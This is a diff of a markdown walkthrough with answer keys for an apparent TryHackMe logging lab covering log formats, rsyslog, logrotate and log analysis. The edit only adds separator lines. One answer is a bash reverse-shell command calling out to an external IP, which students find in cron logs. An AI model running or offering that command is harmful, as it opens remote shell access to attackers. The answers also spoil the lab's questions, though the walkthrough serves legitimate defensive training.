@@ -32,6 +32,8 @@ However you choose to connect the login credentials for damianhall are on this p
 
 </details>
 
+---
+
 *Q2: What is  full path to the suggested log file for initial investigation?*
 
 > look in cat output of the note!
@@ -43,6 +45,8 @@ However you choose to connect the login credentials for damianhall are on this p
     /var/log/gitlab/nginx/access.log
 
 </details>
+
+---
 
 ### Types, Formats, and Standards
 
@@ -60,6 +64,8 @@ There's a lot of good information here about log types and how they are structur
 
 </details>
 
+---
+
 *Q2: Based on the list of log formats in this task, what log format is used by the log file specified in the note from Task 2?*
 
 > The materials clearly list what format the Nginx web server uses by default.
@@ -71,6 +77,8 @@ There's a lot of good information here about log types and how they are structur
     combined
 
 </details>
+
+---
 
 ### Collection, Management, and Centralisation
 
@@ -90,6 +98,8 @@ Go through the exercises and configure rsyslog.
 
 </details>
 
+---
+
 *Q2 What is the IP address of SIEM-02 based on the rsyslog configuration file /etc/rsyslog.d/99-websrv-02-cron.conf, which is used to monitor cron messages?*
 
 > cat /etc/rsyslog.d/99-websrv-02-cron.conf
@@ -102,6 +112,8 @@ Go through the exercises and configure rsyslog.
 
 </details>
 
+---
+
 *Based on the generated logs in /var/log/websrv-02/rsyslog_cron.log, what command is being executed by the root user?*
 
 > cat /var/log/websrv-02/rsyslog_cron.log | grep -E 'root|CMD'
@@ -113,6 +125,8 @@ Go through the exercises and configure rsyslog.
     /bin/bash -c "/bin/bash -i >& /dev/tcp/34.253.159.159/9999 0>&1"
 
 </details>
+
+---
 
 ### Storage, Retention and Deletion
 
@@ -132,6 +146,8 @@ Follow the practical activity to automate log rotation.
 
 </details>
 
+---
+
 *Q2: Based on the logrotate configuration /etc/logrotate.d/99-websrv-02_cron.conf, what is the log rotation frequency?*
 
 > See the output for the last question.
@@ -143,6 +159,8 @@ Follow the practical activity to automate log rotation.
     hourly
 
 </details>
+
+---
 
 ### Hands-on Exercise: Log analysis process, tools, and techniques
 
@@ -176,6 +194,8 @@ Again follow the url (not the link) in your browser (connected to the THM networ
 
 </details>
 
+---
+
 *What is the process of standardising parsed data into a more easily readable and query-able format?*
 
 > This is what we did to the log file with all those awk sed and sort and uniq commands...
@@ -188,6 +208,8 @@ Again follow the url (not the link) in your browser (connected to the THM networ
 
 </details>
 
+---
+
 *What is the process of consolidating normalised logs to enhance the analysis of activities related to a specific IP address?*
 
 > This one isn't initially obvious unless you've really understood the reading at the start of this chapter. When we consolidate multiple logs we are really adding value to our log files. When we add extra context to a log in the form of say, an IP address we are performing xxxxxxxxxx on the log. Forgive my grammar the gerund form would be more natural here but the answer is the noun.
@@ -199,6 +221,8 @@ Again follow the url (not the link) in your browser (connected to the THM networ
     enrichment
 
 </details>
+
+---
 
 ### Conclusion
 
